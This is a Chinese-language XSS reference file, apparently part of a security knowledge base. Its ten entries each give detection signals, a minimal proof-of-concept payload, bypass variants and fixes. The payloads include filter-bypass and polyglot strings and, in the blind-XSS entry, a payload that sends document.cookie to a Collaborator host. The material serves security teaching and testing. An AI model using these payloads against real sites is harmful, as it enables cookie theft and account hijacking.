# 02 — Cross-Site Scripting (XSS)

> 来源：PortSwigger Web Security Academy / OWASP / HackTricks / PayloadsAllTheThings / CWE

---

### [KB-XSS-01] Reflected XSS
- **类别**: XSS — Reflected
- **信号**: 用户输入被直接回显在 HTTP 响应体中，未做 HTML 实体编码；提交 `< > " ' &` 字符后在页面源码中保持原样
- **原理**: 服务端将请求参数值原样拼接进响应 HTML，攻击者诱导受害者点击恶意链接（含脚本 payload），浏览器解析后执行
- **最小PoC**: `GET /search?q=<script>alert(document.domain)</script>` → 页面弹出域名的 alert 对话框；或提交 `<img src=x onerror=alert(1)>` 观察是否触发
- **绕过与变体**: 标签闭合 `"></script><script>`；事件属性注入 `"onmouseover="alert(1)`；大小写混淆 `<ScRiPt>`；编码绕过（URL 编码、HTML 实体双重编码）；使用 `<img/onerror>`、`<svg/onload>`、`<body/onload>` 等非 script 标签绕过黑名单
- **修复**: 输出上下文感知编码（HTML 实体编码 `< → &lt;` 等），Content-Security-Policy 头，`X-XSS-Protection` 头，输入验证（白名单），`HttpOnly` Cookie
- **参考**: CWE-79 / PortSwigger: Reflected XSS

---

### [KB-XSS-02] Stored XSS
- **类别**: XSS — Stored / Persistent
- **信号**: 用户提交的内容被持久化（数据库/文件/日志），之后在页面渲染时执行；评论、个人资料、私信等功能点存在输入→存储→回显链路
- **原理**: 恶意脚本被保存到服务端存储中，后续所有访问该内容的用户（或管理员）浏览器都会执行 payload，无需用户额外交互
- **最小PoC**: 在评论框或用户资料字段提交 `<script>alert(document.cookie)</script>`，刷新页面或切换到管理员视角查看该内容时触发弹窗
- **绕过与变体**: 提交后 payload 可能在多个上下文渲染（HTML body、属性值、`<script>` 块、`<style>` 块、URL 参数），需按渲染点调整注入方式；双重编码绕过服务端过滤后浏览器仍解码执行；后端过滤后用前端渲染逃逸（如 Angular `{{constructor.constructor('alert(1)')()}}`）
- **修复**: 输入验证 + 输出编码（双重防护），存储前规范化（canonicalization），对管理员视图单独做 CSP 策略加固，避免富文本时使用白名单标签（DOMPurify / sanitize-html）
- **参考**: CWE-79 / PortSwigger: Stored XSS / OWASP: Stored XSS

---

### [KB-XSS-03] DOM-based XSS
- **类别**: XSS — DOM-based
- **信号**: 前端 JavaScript 使用危险 sink（`innerHTML`、`document.write`、`eval`、`location` 相关操作）处理用户可控的 source（`location.hash`、`document.URL`、`window.name`、`postMessage` 数据）且未做过滤；payload 不经过服务端，只在前端触发
- **原理**: 客户端 JavaScript 从不安全的数据源（source）获取数据，并通过不安全的写入方式（sink）注入 DOM，无需服务端参与即执行恶意代码
- **最小PoC**: URL `https://example.com/#<img src=x onerror=alert(1)>`，页面 JS 中存在 `document.getElementById('x').innerHTML = location.hash.slice(1);` 则触发
- **绕过与变体**: Source 来源多样（`document.referrer`、`window.name`、`postMessage`、`localStorage`、`sessionStorage`）；Sink 包括 `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`onevent` 属性赋值、`eval()`、`Function()`、`setTimeout/setInterval(string)`、`document.write/writeln`、`location.href/assign/replace`、`Range.createContextualFragment()`；URL 编码、JS 字符串逃逸、模板字面量注入
- **修复**: Source 侧用 URLSearchParams 等安全 API 替代 `location.*` 裸读；Sink 侧用 `textContent` 替代 `innerHTML`，避免 eval 系列函数；实施 Trusted Types CSP 策略；DOMPurify 对 HTML 做净化后写入
- **参考**: CWE-79 / PortSwigger: DOM-based XSS / OWASP: DOM Based XSS

---

### [KB-XSS-04] Blind XSS
- **类别**: XSS — Blind / Delayed Execution
- **信号**: 输入被提交到后台管理系统、支持工单、日志面板、审核队列等攻击者不可见的界面中渲染执行；无法直接观测触发，依赖外带（OOB）回连确认
- **原理**: Payload 在攻击者无法访问的管理面板或内部系统中渲染执行，通过 DNS/HTTP 外带请求（Burp Collaborator、XSS Hunter、Interactsh）确认漏洞并窃取管理员 Cookie/Token
- **最小PoC**: 在反馈表单提交 `"><img src=x onerror="(new Image()).src='https://your-collaborator.burpcollaborator.net/?c='+document.cookie">`，在 Burp Collaborator 中观察 HTTP/DNS 请求到达
- **绕过与变体**: 使用 `<script>` 标签加载远程 JS 文件做完整会话窃取（XSS Hunter / bXSS）；利用 `<input onfocus="fetch(...)" autofocus>` 自动触发表单字段；PDF 生成器注入（将 XSS payload 插入 HTML 转 PDF 流程中）；邮件客户端中的 XSS
- **修复**: 对所有用户输入在输出时做上下文编码（即使用于内部系统），日志/工单系统的模板引擎使用自动转义，隔离管理面板的认证域（不同子域名减少 cookie 窃取影响）
- **参考**: CWE-79 / PortSwigger: Blind XSS / HackTricks: Blind XSS

---

### [KB-XSS-05] CSP Bypass via JSONP
- **类别**: XSS — CSP Bypass
- **信号**: 目标站点配置了较严格的 CSP（如 `script-src 'self'` 或 nonce/hash），但同源或白名单域中存在 JSONP 回调端点（`callback`、`jsonp` 参数可控制函数名）
- **原理**: CSP 的 `script-src` 白名单中包含的域存在 JSONP 端点，攻击者利用 JSONP 回调参数注入任意 JS 函数调用，以白名单域为跳板加载恶意代码绕过 CSP
- **最小PoC**: 页面存在 `<script src="/api/data?callback=alert//"></script>`，当 `/api/data` 返回 `alert(//{"data":...})` 时执行；或利用 AngularJS 库（白名单 CDN 上的 angular.js）通过 `{{constructor.constructor('alert(1)')()}}` 执行
- **绕过与变体**: 利用同源的回调参数反射 JSONP 端点；利用白名单 CDN 上的已知 AngularJS 版本做 CSP bypass sandbox 逃逸；利用 `script-src 'unsafe-eval'` 的 `eval()`/`Function()` 漏洞；利用 `strict-dynamic` 配合已加载的合法脚本构建出脚本注入链；利用 `base-uri` 缺失配合 DOM XSS 做脚本注入
- **修复**: JSONP 端点使用固定回调名或静态函数映射替代动态回调参数；使用 nonce 或 hash 替代域名白名单 CSP；关闭不安全的 JSONP 端点替换为 CORS + JSON；配合 `strict-dynamic` 并确保无已知 DOM XSS sink
- **参考**: PortSwigger: CSP bypass / CWE-79 / HackTricks: CSP Bypass

---

### [KB-XSS-06] Mutation XSS (mXSS)
- **类别**: XSS — mXSS
- **信号**: 用户输入经过客户端 sanitizer（DOMPurify、浏览器内置 sanitizer）处理后被视为安全 HTML，但在 `innerHTML` 赋值时因浏览器解析器的规范化（mutation）行为再次改变 DOM 结构，使原本被过滤的恶意片段重新出现
- **原理**: HTML sanitizer 和浏览器渲染引擎对同一段 HTML 的解析树可能不同——sanitizer 解析时不可执行的片段，经过浏览器序列化→反序列化（round-trip）或 DOM 树合并规范化后变成可执行，绕过 XSS 过滤器
- **最小PoC**: `<svg><p><style><img src=x onerror=alert(1)></style></p></svg>` — 某些 sanitizer 版本下，该片段通过净化后赋给 `innerHTML` 时，浏览器重新解析出可执行的 `<img>` 标签
- **绕过与变体**: 利用 `</style><` 或 `<math><mtext><table><mglyph>` 等 SVG/MathML 命名空间混乱；`<table>` 嵌套导致的 foster parenting 行为；利用 sanitizer 版本差异（DOM clobbering 配合命名空间切换）；`<noscript>` 与 `<iframe srcdoc>` 嵌套；利用浏览器解析的容错特性产生 tree builder 差异
- **修复**: 服务端做 HTML sanitization（避免仅依赖客户端 sanitizer），保持 sanitizer 库为最新版，使用 `document.createElement('template')` 的 inert document 解析，采用严格的命名空间感知解析器，CSP 纵深防御
- **参考**: CWE-79 / HackTricks: mXSS / PortSwigger: Mutation XSS

---

### [KB-XSS-07] SVG-based XSS
- **类别**: XSS — SVG Injection
- **信号**: 站点允许上传或内联 SVG 文件，但未做充分净化；SVG 中嵌入了 `<script>`、`<foreignObject>` 或事件处理器（`onload`、`onbegin` 等）
- **原理**: SVG 是 XML 方言，原生支持 `<script>` 标签和事件处理器，嵌入网页后（`<img src="x.svg">` 不会执行脚本，但 `<object>`、`<embed>`、`<iframe>`、`<svg>` 内联会执行），可执行任意 JS
- **最小PoC**: 上传或注入如下 SVG：`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`；或使用事件：`<svg/onload=alert(1)>`；或 `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
- **绕过与变体**: `<foreignObject>` 内嵌 XHTML 含 `<script>`；`<use>` 标签引用外部 SVG 文件（类似 SSRF + XSS）；SVG 内 `<a>` 标签 + `xlink:href` 的 `javascript:` 伪协议；SVG 内 data URI 嵌套；CDATA 块绕过；URL 编码/HTML 实体编码绕过过滤；利用 SVG 滤镜做 CSS-based 数据窃取
- **修复**: SVG 上传后解析并移除 `<script>`、`<foreignObject>`、事件属性、`javascript:` 协议；以 `<img src>` 方式渲染 SVG（禁用脚本执行）；使用独立的 sandbox 域托管用户内容的 SVG；Content-Type 设为 `image/svg+xml` + `Content-Disposition: attachment` 强制下载而非内联渲染
- **参考**: CWE-79 / HackTricks: XSS in SVG / PortSwigger: File Upload XSS

---

### [KB-XSS-08] AngularJS Template Injection
- **类别**: XSS — Client-Side Template Injection
- **信号**: 目标站点使用了 AngularJS (1.x)，用户输入被嵌入到 Angular 模板表达式 `{{ }}` 中而未做沙箱逃逸防护；或 `ng-app`、`ng-controller` 范围内存在反射型注入点
- **原理**: AngularJS 的双花括号插值语法和 `ng-bind-html` 等指令在 digest 周期中对模板表达式求值，若攻击者能在 Angular scope 内注入表达式，可绕过 Angular 沙箱调用原生 JS 构造函数链执行任意代码
- **最小PoC**: `{{constructor.constructor('alert(1)')()}}` — 通过 `constructor` 链访问 `Function` 构造函数，动态创建并执行代码；或在 URL 参数中注入 `{{$on.constructor('alert(1)')()}}`（Angular 1.6+ 沙箱移除后更简单）
- **绕过与变体**: 早期 Angular 版本沙箱绕过技巧（使用 `toString`、`fromCharCode`、`orderBy` filter 等构造调用链）；在 `ng-src`、`ng-href`、`ng-include` 等属性中注入表达式；利用 `$eval`、`$parse` 服务；Angular 1.6+ 移除了沙箱，任何表达式注入直接获得完整 JS 执行能力；CSTI 也可在 Vue.js（`v-html`/`v-bind`）、React（`dangerouslySetInnerHTML` + JSX 注入）中发生
- **修复**: 升级到 Angular (2+)（不再有 Sandbox 逃逸概念，模板在编译时处理），避免将用户输入直接插入 Angular 模板字符串中，使用 `$sce`（Strict Contextual Escaping）服务对不可信值做严格上下文转义，使用 nonce-based CSP 拦截动态构造的脚本
- **参考**: CWE-94 / PortSwigger: Client-Side Template Injection / HackTricks: AngularJS CSTI

---

### [KB-XSS-09] Polyglot XSS Payloads
- **类别**: XSS — Payload Crafting
- **信号**: 目标输入点存在多种过滤规则（WAF、自定义过滤器），单一 payload 无法穿透；需要一个能在多种上下文（HTML、属性、SVG、注释、`<script>` 块）中同时触发的通用 payload
- **原理**: Polyglot（多语言）payload 利用 HTML/JS/SVG/CSS 语法的重叠特性，构造一段在所有解析模式下都能执行恶意代码的字符串，实现对多上下文注入点的通用化攻击
- **最小PoC**: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` — 该 payload 同时逃逸 HTML 注释、`<title>`、`<style>`、`<textarea>`、`<script>`、`<xmp>` 标签，并在 `<svg onload>` 中触发 alert
- **绕过与变体**: 核心构造技巧：`/*` 在 HTML 中为注释结束但在 JS 中为多行注释开始，`</...>` 闭合各种标签，`+/"/+` 利用 JS 加号运算符连接字符串逃逸属性引用；可针对不同注入点定制：属性内 polyglot（`"onmouseover="alert(1)`）、URL 内 polyglot（`javascript:` 和 data URI）、特定标签内 polyglot（利用嵌套上下文）
- **修复**: 分层防御而非依赖单点过滤——输入验证（白名单）+ 上下文感知输出编码（HTML 实体编码、JS 编码、URL 编码各管各的） + CSP；测试时禁止仅依赖黑名单/正则过滤器的安全性
- **参考**: CWE-79 / HackTricks: XSS Polyglot / PayloadsAllTheThings: XSS Injection

---

### [KB-XSS-10] XSS via File Upload (SVG/HTML)
- **类别**: XSS — File Upload
- **信号**: 文件上传功能允许 SVG、HTML、MHT、XML、SWF 等可嵌脚本的文件类型；上传后页面通过 `<object>`、`<embed>`、`<iframe>` 或直接导航到文件 URL 渲染，触发脚本执行
- **原理**: 上传的文件中包含可执行的 JavaScript（SVG `<script>`/`onload`、HTML `<script>`、XML XSLT、SWF ActionScript），当浏览器以非沙箱模式（非 `<img>` 标签）渲染该文件时，payload 在当前域上下文中执行，导致同源 XSS
- **最小PoC**: 上传 `evil.svg` — `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`；或上传 HTML 文件 `<html><body><script>alert(document.cookie)</script></body></html>`；通过 `<iframe src="/uploads/evil.svg">` 或 `<object data="/uploads/evil.svg">` 触发执行
- **绕过与变体**: 多语言文件（GIF + JS / JPEG + JS）——文件头伪装为图片 MIME，内容同时也是有效 HTML/JS（`GIF89a=1;alert(1)//`）；SVG 内 `<foreignObject>` 含 `<iframe>`；XSLT 转换中 `<xsl:script>`；MIME 类型混淆（服务端返回 `text/html` 但声称是 `image/png`）；Flash `<param name="FlashVars" value="javascript:...">`；利用 ZIP/PDF 预览器中的 XSS（Chromium `chrome://` 处理）
- **修复**: 上传文件白名单（仅允许必要类型），以安全方式托管用户文件（独立子域名/domain，如 `usercontent.example.com`），强制 `Content-Disposition: attachment`，SVG 文件服务时加 CSP `sandbox` 头，对上传文件做服务端扫描（ClamAV 等）并 strip 脚本标签
- **参考**: CWE-434 / CWE-79 / PortSwigger: File Upload / HackTricks: XSS via File Upload
